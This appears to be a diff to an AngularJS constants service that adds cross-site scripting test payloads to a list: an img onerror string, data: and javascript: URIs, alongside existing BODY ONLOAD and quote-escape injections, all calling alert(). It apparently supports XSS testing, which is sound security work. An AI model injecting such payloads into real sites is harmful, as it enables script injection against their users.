@@ -36,6 +36,22 @@ app.service('appConstants', function() {
             "value": `<BODY ONLOAD=alert('XSS')>`
         },
         {
+            "name": "Img src onerror",
+            "value": `<img src=x onerror=alert()>`
+        },
+        {
+            "name": "data:text",
+            "value": `data:text/Javascript,alert()`
+        },
+        {
+            "name": "data:text",
+            "value": `data:html,alert()`
+        },
+        {
+            "name": "Javascript alert",
+            "value": `JavaScript:alert()`
+        },
+        {
             "name": "Escaping JavaScript escapes 1",
             "value": `\";alert('XSS');//`
         },
